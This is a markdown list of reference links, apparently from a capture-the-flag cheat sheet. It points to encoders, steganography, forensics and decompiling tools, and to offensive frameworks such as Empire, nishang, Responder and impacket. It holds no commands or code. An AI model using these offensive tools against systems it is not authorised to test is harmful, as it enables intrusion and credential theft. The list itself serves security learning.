[XSS]: https://en.wikipedia.org/wiki/Cross-site_scripting
[HTML]: https://en.wikipedia.org/wiki/HTML
[JavaScript]: https://en.wikipedia.org/wiki/JavaScript
[PEiD]: https://www.aldeid.com/wiki/PEiD
[wpscan]: https://wpscan.org/
[Ruby]: https://www.ruby-lang.org/en/
[Wordpress]: https://en.wikipedia.org/wiki/WordPress
[dumpzilla]: http://www.dumpzilla.org/
[hexed.it]: https://hexed.it/
[Magic Numbers]: https://en.wikipedia.org/wiki/Magic_number_(programming)#Magic_numbers_in_files
[Magic Number]: https://en.wikipedia.org/wiki/Magic_number_(programming)#Magic_numbers_in_files
[Edit This Cookie]: http://www.editthiscookie.com/
[cookie]: https://en.wikipedia.org/wiki/HTTP_cookie
[cookies]: https://en.wikipedia.org/wiki/HTTP_cookie
[formatStringExploiter]: http://formatstringexploiter.readthedocs.io/en/latest/index.html
[format string vulnerability]: https://www.owasp.org/index.php/Format_string_attack
[printf vulnerability]: https://www.owasp.org/index.php/Format_string_attack
[Java]: https://en.wikipedia.org/wiki/Java_(programming_language)
[JAR]: https://en.wikipedia.org/wiki/JAR_(file_format)
[OpenStego]: https://www.openstego.com/
[Stegsolve.jar]: http://www.caesum.com/handbook/stego.htm
[Stegsolve]: http://www.caesum.com/handbook/stego.htm
[tcpflow]: https://github.com/simsong/tcpflow
[PcapXray]: https://github.com/Srinivas11789/PcapXray
[Atbash Cipher]: https://en.wikipedia.org/wiki/Atbash
[TestDisk]: https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.1-WIP.linux26.tar.bz2
[PNG]: https://en.wikipedia.org/wiki/Portable_Network_Graphics
[jd-gui]: https://github.com/java-decompiler/jd-gui
[dex2jar]: https://github.com/pxb1988/dex2jar
[apktool]: https://ibotpeaches.github.io/Apktool/
[RCE]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
[remote code execution]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
[arbitrary code execution]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
[XSStrike]: https://github.com/UltimateHackers/XSStrike
[nishang]: https://github.com/samratashok/nishang
[Malboge]: https://en.wikipedia.org/wiki/Malbolge
[Piet]: https://esolangs.org/wiki/Piet
[npiet]: https://www.bertnase.de/npiet/
[LC4]: https://www.schneier.com/blog/archives/2018/05/lc4_another_pen.html
[Empire]: https://github.com/EmpireProject/Empire
[Base64]: https://en.wikipedia.org/wiki/Base64
[Base32]: https://en.wikipedia.org/wiki/Base32
[Base85]: https://en.wikipedia.org/wiki/Ascii85
[Base91]:https://www.dcode.fr/base-91-encoding
[fcrackzip]: https://github.com/hyc/fcrackzip
[zsteg]: https://github.com/zed-0xff/zsteg
[jsteg]: https://github.com/lukechampine/jsteg
[jstego]: https://sourceforge.net/projects/jstego/
[StegCracker]: https://github.com/Paradoxis/StegCracker
[StegSeek]: https://github.com/RickdeJager/stegseek
[Base41]: https://github.com/sveljko/base41/blob/master/python/base41.py
[Base65535]: https://github.com/qntm/base65536
[Easy Python Decompiler]: https://github.com/aliansi/Easy-Python-Decompiler-v1.3.2
[photorec]: https://www.cgsecurity.org/wiki/PhotoRec
[smbmap]: https://github.com/ShawnDEvans/smbmap
[oletools]: https://github.com/decalage2/oletools
[impacket]: https://github.com/SecureAuthCorp/impacket
[Responder]: https://github.com/SpiderLabs/Responder
[Responder.py]: https://github.com/SpiderLabs/Responder
[International Code of Signals Maritime]: https://en.wikipedia.org/wiki/International_Code_of_Signals
[maritime flags translator]: https://www.dcode.fr/maritime-signals-code
[static-binaries]: https://github.com/andrew-d/static-binaries
